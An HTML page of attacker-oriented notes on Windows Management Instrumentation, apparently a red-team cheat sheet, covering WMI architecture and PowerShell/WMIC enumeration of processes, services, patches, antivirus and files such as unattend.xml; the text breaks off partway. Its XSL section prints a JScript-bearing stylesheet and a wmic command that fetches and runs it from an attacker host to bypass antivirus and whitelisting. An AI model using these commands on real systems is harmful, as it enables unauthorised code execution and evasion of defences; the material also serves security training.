<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="readloud">
    
    <link rel="shortcut icon" href="../../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Wmi 4 Attackers - readloud.org</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "WMI 4 Attackers", url: "#_top", children: [
              {title: "WMI 101", url: "#wmi-101" },
              {title: "WMI Components", url: "#wmi-components" },
              {title: "WMI with PowerShell", url: "#wmi-with-powershell" },
              {title: "WMI host recon", url: "#wmi-host-recon" },
              {title: "WMI Active Directory Recon", url: "#wmi-active-directory-recon" },
              {title: "WMI Console (WMIC)", url: "#wmi-console-wmic" },
              {title: "Remote WMI", url: "#remote-wmi" },
              {title: "Registry key manipulation", url: "#registry-key-manipulation" },
              {title: "Recon and information gathering", url: "#recon-and-information-gathering" },
              {title: "Exploitation", url: "#exploitation" },
              {title: "Lateral movement", url: "#lateral-movement" },
              {title: "WMI Persistence", url: "#wmi-persistence" },
              {title: "Resources", url: "#resources" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav">
      <a href="../macos%20intrusion/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../macos%20intrusion/" class="btn btn-xs btn-link">
        macOS intrusion
      </a>
    </div>
    
  </div>

    

    <h1 id="wmi-4-attackers">WMI 4 Attackers</h1>
<ul>
<li><a href="#wmi-4-attackers">WMI 4 Attackers</a></li>
<li><a href="#wmi-101">WMI 101</a></li>
<li><a href="#wmi-components">WMI Components</a><ul>
<li><a href="#wmi-utilities">WMI utilities</a></li>
<li><a href="#manaed-object-format-mof-files">Manaed Object Format (MOF) files</a></li>
<li><a href="#providers">Providers</a></li>
<li><a href="#managed-objects">Managed Objects</a></li>
<li><a href="#namespaces">Namespaces</a></li>
<li><a href="#repository">Repository</a></li>
<li><a href="#consumers">Consumers</a></li>
<li><a href="#remote-wmi-protocols">Remote WMI Protocols</a></li>
<li><a href="#dcom">DCOM</a></li>
<li><a href="#winrm--powershell-remoting">WinRM / PowerShell Remoting</a></li>
<li><a href="#wmi-and-xsl">WMI and XSL</a></li>
</ul>
</li>
<li><a href="#wmi-with-powershell">WMI with PowerShell</a></li>
<li><a href="#wmi-host-recon">WMI host recon</a></li>
<li><a href="#wmi-active-directory-recon">WMI Active Directory Recon</a></li>
<li><a href="#wmi-methods">WMI Methods</a></li>
<li><a href="#association-classes">Association classes</a></li>
<li><a href="#wmi-console-wmic">WMI Console (WMIC)</a></li>
<li><a href="#remote-wmi">Remote WMI</a></li>
<li><a href="#registry-key-manipulation">Registry key manipulation</a></li>
<li><a href="#recon-and-information-gathering">Recon and information gathering</a></li>
<li><a href="#exploitation">Exploitation</a></li>
<li><a href="#lateral-movement">Lateral movement</a><ul>
<li><a href="#wmi-attacks--c2-communication-wmi-class--push-attack">WMI Attacks – C2 Communication (WMI Class) – “Push” Attack</a></li>
<li><a href="#wmi-attacks--c2-communication-registry--pull-attack">WMI Attacks – C2 Communication (Registry) – “Pull” Attack</a></li>
<li><a href="#command-execution-win32_service">Command Execution Win32_Service</a></li>
</ul>
</li>
<li><a href="#wmi-persistence">WMI Persistence</a><ul>
<li><a href="#malicious-wmi-providers">Malicious WMI providers</a></li>
<li><a href="#win32_localadmins-provider">Win32_LocalAdmins provider</a></li>
<li><a href="#evilnetconnection-wmi-provider">EvilNetConnection WMI Provider</a></li>
<li><a href="#evilwmiprovider-subtee">EvilWMIProvider (SubTee)</a></li>
<li><a href="#wmi-backdoor">WMI Backdoor</a></li>
<li><a href="#mof-files">MOF files</a></li>
<li><a href="#wmi-event-subscriptions">WMI Event Subscriptions</a></li>
</ul>
</li>
<li><a href="#resources">Resources</a><ul>
<li><a href="#blackhat-us-2015-abusing-wmi-to-built-a-persistent-asyncronous-and-fileless-backdoor">BlackHat US 2015: Abusing WMI to built a persistent, asyncronous, and fileless backdoor.</a></li>
<li><a href="#wmisploit">WMISploit</a></li>
<li><a href="#wmi-for-script-kiddies">WMI for Script Kiddies</a></li>
<li><a href="#usefull-wmic-queries-for-host-and-domain-enumeration">Usefull WMIC queries for host and domain enumeration</a></li>
<li><a href="#red-team-handbook-wmi-command">Red Team handbook WMI command</a></li>
<li><a href="#nolimitsecu-french-podcast-dedicated-to-wmi">NoLimitSecu French Podcast dedicated to WMI</a></li>
<li><a href="#andrei-dumitrescu---ocd">Andrei Dumitrescu - OCD</a></li>
<li><a href="#backdoor-with-wmi">Backdoor with WMI</a></li>
</ul>
</li>
</ul>
<h2 id="wmi-101">WMI 101</h2>
<p><em>WMI = Windows Management Instrumentation</em><br />
- https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-architecture</p>
<p>--&gt; Microsoft implementationn of CIM (Common Information Model) and  WBEM (Web Based Enterprise Management).<br />
--&gt; Provides a uniform interface for applications/scripts to manage a local or remote computer or network.  </p>
<p><em>WMIC = Command-Line interface for WMI</em></p>
<p><img src="./images/wmi-architecture.png" width="500"/></p>
<h2 id="wmi-components">WMI Components</h2>
<p>https://0xinfection.github.io/posts/wmi-classes-methods-part-2/</p>
<h3 id="wmi-utilities">WMI utilities</h3>
<ul>
<li>wmic.exe</li>
<li>winrm.exe</li>
<li>wbemtest.exe</li>
<li>VBScript</li>
<li>JScript</li>
<li>IWbem COM API</li>
<li>.NET System.Management classes</li>
</ul>
<p><strong>Linux</strong>
- wmis-pth
- wmic</p>
<h3 id="manaed-object-format-mof-files">Manaed Object Format (MOF) files</h3>
<p>Use to define WMI namespaces, classes, provides etc...  </p>
<ul>
<li>Stored in <code>%WINDIR%\System32\Wbem\</code> directory with extension <em>.mof</em></li>
<li>We can write our own MOF files to expand WMI</li>
</ul>
<h3 id="providers">Providers</h3>
<p>Generally, provider is associated with every <em>MOF</em> file.<br />
- A provider could be a DLL within <code>%WINDIR%\System32\Wbem\</code> directory  or could be othe type (Class, Instance, Event, Event Consumer, Method)
- A provider just like a driver, works as a bridge between a managed object and WMI.</p>
<p>--&gt; Provider main function is to provide access to classes.</p>
<h3 id="managed-objects">Managed Objects</h3>
<p>Managed object is the component being managed by WMI like process, service, operating systems etc...  </p>
<h3 id="namespaces">Namespaces</h3>
<p>Namespaces are crearted by providers and are used to divide classes logically.</p>
<p>Well known namespaces are :
- root\cimv2
- root\default
- root\security
- root\subscription</p>
<h3 id="repository">Repository</h3>
<p>WMI repository is the database used to store static data (definitions) of classes.</p>
<ul>
<li>Located in the <code>%WINDIR%\System32\Wbem\Repository</code> directory  </li>
</ul>
<h3 id="consumers">Consumers</h3>
<p>Applications or scripts which can be used to interact with WMI classes for query of data or to run methods or to subscribe to events.</p>
<ul>
<li>PowerShell</li>
<li>WMIC.exe</li>
<li>... </li>
</ul>
<h3 id="remote-wmi-protocols">Remote WMI Protocols</h3>
<h4 id="dcom">DCOM</h4>
<ul>
<li>Port 135</li>
<li>Not firewall friendly</li>
<li>By default WMI service <strong>Winmgmt</strong> is running and listening on port 135.</li>
</ul>
<p>Enumerate processes on remote system
<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>Get-WmiObject -Class Win32_Process -ComputerName 192.168.2.10 -Credential &#39;corp.local\admin&#39;
</span></code></pre></div></p>
<h4 id="winrm-powershell-remoting">WinRM / PowerShell Remoting</h4>
<ul>
<li>SOAP protocl based on the WSMan specification</li>
<li>5985 (HTTP) or 5986 (HTTPS)</li>
</ul>
<h4 id="wmi-and-xsl">WMI and XSL</h4>
<ul>
<li>https://www.ired.team/offensive-security/code-execution/application-whitelisting-bypass-with-wmic-and-xsl</li>
<li>https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1220/T1220.md</li>
</ul>
<p>This can be used to bypass AV solution or Application Whitelisting.</p>
<p>XSL file to be hosted on attacker machine
<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>&lt;?xml version=&#39;1.0&#39;?&gt;
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>&lt;stylesheet
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>xmlns=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:ms=&quot;urn:schemas-microsoft-com:xslt&quot;
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>xmlns:user=&quot;placeholder&quot;
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>version=&quot;1.0&quot;&gt;
</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>&lt;output method=&quot;text&quot;/&gt;
</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>    &lt;ms:script implements-prefix=&quot;user&quot; language=&quot;JScript&quot;&gt;
</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>    &lt;![CDATA[
</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>    var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc&quot;);
</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>    ]]&gt; &lt;/ms:script&gt;
</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>&lt;/stylesheet&gt;
</span></code></pre></div></p>
<p>Retrieving and executing wmic command on <strong>victim</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>wmic os get /FORMAT:&quot;http://192.168.0.10:8000/attacker.xsl&quot;
</span></code></pre></div></p>
<h2 id="wmi-with-powershell">WMI with PowerShell</h2>
<p>Listing WMI providers within PowerShell Version 2 cmdlet:</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>Get-Command -CommandType cmdlet *wmi*
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>
</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>Get-WmiObject : Retrieve instances
</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>Invoke-WmiMethod : Run a method
</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>Register-WmiEvent : Register WMI events
</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>Remove-WmiObject : Remove an object
</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>Set-WmiInstance : Modify the writable property of WMI object
</span></code></pre></div>
<p>PowerShell version 3 provides CIM (Common Information Model) cmdlets which uses WS-MAN and CIM standards to manage objects.
<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>Get-Command -CommandType cmdlet *cim*
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>
</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>Cmdlet          Get-CimAssociatedInstance                           1.0.0.0    CimCmdlets
</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>Cmdlet          Get-CimClass                                       1.0.0.0    CimCmdlets
</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>Cmdlet          Get-CimInstance                                    1.0.0.0    CimCmdlets
</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>Cmdlet          Get-CimSession                                     1.0.0.0    CimCmdlets
</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>Cmdlet          Invoke-CimMethod                                   1.0.0.0    CimCmdlets
</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>Cmdlet          New-CimInstance                                    1.0.0.0    CimCmdlets
</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>Cmdlet          New-CimSession                                     1.0.0.0    CimCmdlets
</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>Cmdlet          New-CimSessionOption                               1.0.0.0    CimCmdlets
</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>Cmdlet          Register-CimIndicationEvent                        1.0.0.0    CimCmdlets
</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>Cmdlet          Remove-CimInstance                                 1.0.0.0    CimCmdlets
</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>Cmdlet          Remove-CimSession                                  1.0.0.0    CimCmdlets
</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a>Cmdlet          Set-CimInstance                                    1.0.0.0    CimCmdlets
</span></code></pre></div>
--&gt; Use of WS-MAN allows CIM cmdlets to be used against boxes where WMI blocked but WS-MAN (WinRM) is enabled. (even with PSv2 )</p>
<p>Listing all namespaces within <em>root</em> class
<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>PS C:\&gt;  Get-WmiObject -Namespace &quot;root&quot; -Class &quot;__Namespace&quot; 
</span></code></pre></div></p>
<p>Listing all namespaces only select the name property
<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>PS C:\&gt;  Get-WmiObject -Namespace &quot;root&quot; -Class &quot;__Namespace&quot; | select name
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>PS C:\&gt;  Get-CimInstance -Namespace &quot;root&quot; -Class &quot;__Namespace&quot; | select name
</span></code></pre></div></p>
<p>Listing all namespaces nested into other namespaces, in our case <em>root</em> namespace (recursive approach)
<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>function Get-WmiNamespace {
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>    Param (
</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>        $Namespace=&#39;root&#39;
</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>    )
</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>    Get-WmiObject -Namespace $Namespace -Class __NAMESPACE | ForEach-Object {
</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>        ($ns = &#39;{0}\{1}&#39; -f $_.__NAMESPACE,$_.Name)
</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>        Get-WmiNamespace $ns
</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>    }
</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>}
</span></code></pre></div></p>
<h2 id="wmi-host-recon">WMI host recon</h2>
<ul>
<li>Host/OS information: <code>ROOT\CIMV2:Win32_OperatingSystem, Win32_ComputerSystem</code></li>
<li>File/directory listing: <code>ROOT\CIMV2:CIM_DataFile</code></li>
<li>Disk volume listing: <code>ROOT\CIMV2:Win32_Volume</code></li>
<li>Registry operations: <code>ROOT\DEFAULT:StdRegProv</code></li>
<li>Running processes: <code>ROOT\CIMV2:Win32_Process</code></li>
<li>Service listing: <code>ROOT\CIMV2:Win32_Service</code></li>
<li>Event log: <code>ROOT\CIMV2:Win32_NtLogEvent</code></li>
<li>Logged on accounts: <code>ROOT\CIMV2:Win32_LoggedOnUser</code></li>
<li>Mounted shares: <code>ROOT\CIMV2:Win32_Share</code></li>
<li>Installed patches: <code>ROOT\CIMV2:Win32_QuickFixEngineering</code></li>
<li>Installed AV: <code>ROOT\SecurityCenter[2]:AntiVirusProduct</code></li>
</ul>
<p>List class containing "<em>bios</em>" string (by default it will request on root\cimv2 Namespace)
<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>Get-WmiObject -Class *bios* -List
</span></code></pre></div></p>
<p>Get Information regarding the current hardware and system
<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>PS C:\&gt; Get-WmiObject -Class win32_bios
</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>
</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>SMBIOSBIOSVersion : VMW71.00V.18452719.B64.2108091906
</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>Manufacturer      : VMware, Inc.
</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>Name              : VMW71.00V.18452719.B64.2108091906
</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>SerialNumber      : VMware-f3 4f 09 a3 2f 43 66 1e-1c 27 a6 ad 02 bs dd aa
</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>Version           : INTEL  - 6040000
</span></code></pre></div></p>
<p>Listing process running and filtering on <em>explorer.exe</em>
<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>Get-WmiObject -Class Win32_Process -Filter &quot;Name = &#39;explorer.exe&#39;&quot;
</span></code></pre></div></p>
<p>Listing specific process running using the <em>Query</em> parameter
<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>Get-WmiObject -Query &quot;select * from Win32_Process where Name = &#39;explorer.exe&#39;&quot;
</span></code></pre></div></p>
<p>Listing Anti-virus product
<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct
</span></code></pre></div></p>
<p>Listing folder within a directory
<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>Get-CimInstance Win32_Directory -Filter &quot;Name = &#39;C:\\Windows\\System32&#39;&quot; | Get-CimAssociatedInstance -Association Win32_Subdirectory | select Name
</span></code></pre></div>
<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>Get-WmiObject Win32_Directory -filter &#39;Drive=&quot;C:&quot; and Path=&quot;\\&quot;&#39; | Format-Table name
</span></code></pre></div></p>
<p>Listing file with <em>ini</em> extension within <em>C:\</em>
<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>Get-WmiObject CIM_DataFile -filter &#39;Drive=&quot;C:&quot; and Path=&quot;\\Windows\\&quot; and Extension=&quot;ini&quot;&#39; | Format-List *
</span></code></pre></div></p>
<p>Listing Services and state
<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>Get-WmiObject -Class win32_service -computer &quot;.&quot; -Namespace &quot;root\cimv2&quot; | format-list Name, State
</span></code></pre></div></p>
<p>Get processor architecture details
<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>Get-WmiObject -Class Win32_Processor
</span></code></pre></div></p>
<p>List current logged accountlist installed patches wmi
<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>Get-WmiObject -class Win32_ComputerSystem | Format-List Username
</span></code></pre></div></p>
<p>List installed security update
<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>Get-Wmiobject -Class win32_quickfixengineering
</span></code></pre></div></p>
<p>List all process with their command line used to start
<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>Get-WmiObject -Class &quot;Win32_Process&quot; -ComputerName &quot;.&quot; | Format-List -Property CommandLine, Name
</span></code></pre></div></p>
<p>List specific process (cmd.exe) and command line used to start
<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>Get-WmiObject -Class &quot;Win32_Process&quot; -ComputerName &quot;.&quot; | where {($_.name -eq &#39;powershell.exe&#39;)} | Format-List -Property CommandLine, Name
</span></code></pre></div></p>
<p>Get-WmiObject -Class Win32_NTEventLogFile -ComputerName $strComputer | Where-Object {$_.LogFileName -eq 'security'}</p>
<p>Path to executables for running services and user runnning services
<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>Get-WmiObject -Class Win32_Service | select Name, StartName, PathName
</span></code></pre></div></p>
<p>Remove WMI objects:<br />
WMI returns <em>live</em>, <em>editable</em>, objects so you can for exemple kill a process using WMI.
<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>Get-WmiObject -Class Win32_Process | Where-Object {$_.Name -eq &quot;notepad.exe&quot;} | Remove-WmiObject 
</span></code></pre></div></p>
<p>Searching for file recursively
<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>function get-wmifile {
</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>[CmdletBinding()]
</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>param (
</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a> [Parameter(Mandatory = $true)]
</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a> [string]$path,
</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a> [string]$file
</span><span id="__span-24-7"><a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a>)
</span><span id="__span-24-8"><a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a>
</span><span id="__span-24-9"><a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a>if ($path.IndexOf(&#39;\\&#39;) -le 0 ){
</span><span id="__span-24-10"><a id="__codelineno-24-10" name="__codelineno-24-10" href="#__codelineno-24-10"></a>  $path = $path.replace(&#39;\&#39;, &#39;\\&#39;)
</span><span id="__span-24-11"><a id="__codelineno-24-11" name="__codelineno-24-11" href="#__codelineno-24-11"></a>}
</span><span id="__span-24-12"><a id="__codelineno-24-12" name="__codelineno-24-12" href="#__codelineno-24-12"></a>
</span><span id="__span-24-13"><a id="__codelineno-24-13" name="__codelineno-24-13" href="#__codelineno-24-13"></a>if ($path.IndexOf(&#39;*&#39;) -ge 0 ){
</span><span id="__span-24-14"><a id="__codelineno-24-14" name="__codelineno-24-14" href="#__codelineno-24-14"></a>  $path = $path.replace(&#39;*&#39;, &#39;%&#39;)
</span><span id="__span-24-15"><a id="__codelineno-24-15" name="__codelineno-24-15" href="#__codelineno-24-15"></a>}
</span><span id="__span-24-16"><a id="__codelineno-24-16" name="__codelineno-24-16" href="#__codelineno-24-16"></a>
</span><span id="__span-24-17"><a id="__codelineno-24-17" name="__codelineno-24-17" href="#__codelineno-24-17"></a>Write-Verbose -Message &quot;Path to search: $path&quot;
</span><span id="__span-24-18"><a id="__codelineno-24-18" name="__codelineno-24-18" href="#__codelineno-24-18"></a>
</span><span id="__span-24-19"><a id="__codelineno-24-19" name="__codelineno-24-19" href="#__codelineno-24-19"></a>$folders = Get-CimInstance -ClassName Win32_Directory -Filter &quot;Name LIKE &#39;$path&#39;&quot;
</span><span id="__span-24-20"><a id="__codelineno-24-20" name="__codelineno-24-20" href="#__codelineno-24-20"></a>foreach ($folder in $folders){
</span><span id="__span-24-21"><a id="__codelineno-24-21" name="__codelineno-24-21" href="#__codelineno-24-21"></a> if ($file) {
</span><span id="__span-24-22"><a id="__codelineno-24-22" name="__codelineno-24-22" href="#__codelineno-24-22"></a>   Get-CimAssociatedInstance -InputObject $folder -ResultClassName CIM_DataFile |
</span><span id="__span-24-23"><a id="__codelineno-24-23" name="__codelineno-24-23" href="#__codelineno-24-23"></a>   where Name -Like &quot;*$file&quot; |
</span><span id="__span-24-24"><a id="__codelineno-24-24" name="__codelineno-24-24" href="#__codelineno-24-24"></a>   Select Name
</span><span id="__span-24-25"><a id="__codelineno-24-25" name="__codelineno-24-25" href="#__codelineno-24-25"></a> }
</span><span id="__span-24-26"><a id="__codelineno-24-26" name="__codelineno-24-26" href="#__codelineno-24-26"></a> else {
</span><span id="__span-24-27"><a id="__codelineno-24-27" name="__codelineno-24-27" href="#__codelineno-24-27"></a>   Get-CimAssociatedInstance -InputObject $folder -ResultClassName CIM_DataFile |
</span><span id="__span-24-28"><a id="__codelineno-24-28" name="__codelineno-24-28" href="#__codelineno-24-28"></a>   Select Name
</span><span id="__span-24-29"><a id="__codelineno-24-29" name="__codelineno-24-29" href="#__codelineno-24-29"></a> }
</span><span id="__span-24-30"><a id="__codelineno-24-30" name="__codelineno-24-30" href="#__codelineno-24-30"></a>}
</span><span id="__span-24-31"><a id="__codelineno-24-31" name="__codelineno-24-31" href="#__codelineno-24-31"></a>
</span><span id="__span-24-32"><a id="__codelineno-24-32" name="__codelineno-24-32" href="#__codelineno-24-32"></a>}
</span></code></pre></div></p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>. ./get-wmifile.ps1
</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>get-wmifile -path &#39;c:\Windows&#39; -file &#39;unattend.xml&#39;
</span></code></pre></div>
<p>Get owner of a specific process
<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>Get-WmiObject Win32_Process -Filter &quot;name=&#39;calculator.exe&#39;&quot; | Select Name, @{Name=&quot;UserName&quot;; Expression={$_.GetOwner().Domain+&quot;\&quot;+$_.GetOwner().User}} | Sort-Object UserName, Name
</span></code></pre></div></p>
<p>Get owner for all process
